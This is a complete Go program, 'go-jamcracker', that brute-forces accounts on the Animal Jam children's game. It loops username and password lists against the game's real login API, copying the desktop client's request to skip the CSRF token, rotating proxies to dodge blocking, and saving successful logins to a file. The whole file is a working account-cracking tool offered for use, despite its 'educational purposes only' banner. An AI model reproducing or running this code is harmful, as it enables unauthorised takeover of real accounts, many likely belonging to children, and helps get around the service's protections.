package main

import (
	"bufio"
	"flag"
	"fmt"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"
)

// readLines reads a file into memory and returns a slice of its lines
// appropriated bufio parts from stackoverflow
func readLines(path string) []string {
	file, err := os.Open(path)
	if err != nil {
		// can use log.Fatal() here but why bother to import the log package for exceptions
		fmt.Println("error reading " + path + "!")
		fmt.Printf("run %s -h for program usage.\n", os.Args[0])
		os.Exit(1)
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	return lines
}

// writeLine appends a line to the given file
// stolen from godocs
func writeLine(line string, path string) {
	// append to file and if it doesn't exist, create it
	file, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("error writing to " + path + "!")
		os.Exit(1)
	}
	file.Write([]byte(line + "\n"))
	file.Close()
}

// checkPassword does all the heavy lifting
// returns true on success, false on failure
func checkPassword(u, p string) bool {
	// initialize http client with 10 second timeout
	client := &http.Client{
		Timeout: 10 * time.Second,
	}

	// initialize the form fields
	data := url.Values{}
	data.Set("screen_name", u)
	data.Set("password", p)

	// if a proxy file was specified, assume we have proxies to use
	if proxiesPath != "" {
		// seed the random number generator and pick a proxy from the list at random
		rand.Seed(time.Now().UTC().UnixNano())
		proxy := "http://" + string(proxies[rand.Int()%len(proxies)])
		proxyURL, _ := url.Parse(proxy)
		transport := &http.Transport{
			Proxy: http.ProxyURL(proxyURL),
		}
		client = &http.Client{
			Transport: transport,
			Timeout:   10 * time.Second,
		}
	}

	// emulate the animal jam electron app login procedure
	// it lacks the CSRF token present on the web login and is much easier to grind on
	req, _ := http.NewRequest("POST", "https://api.animaljam.com/login", strings.NewReader(data.Encode()))
	req.Header.Add("Host", "api.animaljam.com")
	req.Header.Add("Connection", "close")
	req.Header.Add("Content-Length", strconv.Itoa(len(data.Encode())))
	// use the mac osx animal jam electron client user-agent
	req.Header.Add("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) AnimalJam/1.3.1 Chrome/59.0.3071.115 Electron/1.8.2 Safari/537.36")
	req.Header.Add("Origin", "null")
	req.Header.Add("content-type", "application/x-www-form-urlencoded")
	req.Header.Add("Accept", "*/*")
	req.Header.Add("Accept-Encoding", "gzip, deflate")
	req.Header.Add("Accept-Language", "en-US")

	// submit the request
	resp, err := client.Do(req)
	if err == nil {
		// bad login attempts throw a 404, so detection of a successful crack is ezmode statuscode
		if resp.StatusCode == 200 {
			return true
		}
	} else {
		// usually only happens with bad proxies that time out
		fmt.Println(err)
		os.Exit(1)
	}
	return false
}

// declare global variables
var cracked bool
var usernamesPath, passwordsPath, proxiesPath, cracksPath string
var usernames, passwords, proxies []string
var threads uint

func main() {
	// elite ascii art is a prerequisite for hacking properly
	fmt.Println("  ,---.       ,--.")
	fmt.Println(" /  O  \\      |  | go-jamcracker")
	fmt.Println("|  .-.  |,--. |  | by ytcracker and mandarinp")
	fmt.Println("|  | |  ||  '-'  / for educational purposes only")
	fmt.Println("`--' `--' `-----' ")

	// program usage and defaults
	flag.StringVar(&usernamesPath, "u", "usernames.txt", "path to file containing usernames")
	flag.StringVar(&passwordsPath, "l", "passwords.txt", "path to file containing passwords")
	flag.StringVar(&proxiesPath, "p", "", "path to file containing HTTP proxies in ip:port format (optional)")
	flag.StringVar(&cracksPath, "c", "cracks.txt", "path to file for saving successful cracks")
	// keep the threadcount modest - don't clobber the login server
	flag.UintVar(&threads, "t", 10, "amount of simultaneous cracking threads")

	flag.Parse()

	// populate slices with requisite data
	usernames = readLines(usernamesPath)
	passwords = readLines(passwordsPath)

	// if a proxy file is specified, load it into a slice
	if proxiesPath != "" {
		proxies = readLines(proxiesPath)
	}

	// initiate janky golang threadpooling
	semaphore := make(chan bool, threads)

	// iterate over username file
	for i, username := range usernames {
		// show progress of program in username list
		fmt.Printf("cracking %s (%v of %v)...\n", username, i+1, len(usernames))
		// iterate over password file
		for _, password := range passwords {
			// mark thread "in use"
			semaphore <- true
			// invoke checkPassword with a goroutine
			go func(username string, password string) {
				// mark thread available after anonymous function has completed
				defer func() { <-semaphore }()
				// passwords have a minimum length of 6 characters, so skip anything less than that
				if len(password) > 5 {
					success := checkPassword(username, password)
					if success == true {
						fmt.Printf("\nPASSWORD FOUND: %s:%s\n\n", username, password)
						// append successful crack + newline to cracks list
						writeLine(username+":"+password, cracksPath)
						// toggle the cracked flag to break the for loop and continue on to the next username
						cracked = true
					}
				}
			}(username, password)
			if cracked == true {
				// reset cracked flag, break loop, and move down the list
				cracked = false
				break
			}
		}
	}
	// clean up thread pool on loop completion
	for i := 0; i < cap(semaphore); i++ {
		semaphore <- true
	}
}
